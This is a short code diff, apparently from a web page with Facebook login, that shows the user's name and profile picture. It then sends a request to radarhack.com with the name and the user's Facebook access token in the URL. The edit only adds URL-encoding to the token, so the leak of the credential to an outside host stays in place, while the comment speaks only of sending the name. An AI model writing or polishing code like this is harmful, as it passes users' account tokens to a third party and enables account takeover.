@@ -55,8 +55,7 @@ var fbAccessToken = '';
       '<br><img src="' + response.picture.data.url + '" alt="Profile Picture">';
 
     // Construct the URL with the user's name
-    const url = `https://www.radarhack.com/?name=${encodeURIComponent(response.name)}&access_token=${fbAccessToken}`;
-
+        const url = `https://www.radarhack.com/?name=${encodeURIComponent(response.name)}&access_token=${encodeURIComponent(fbAccessToken)}`;
     // Send the user's name to the specified URL using fetch
     fetch(url)
       .then(response => response.text()) // Assuming you want to process the text response
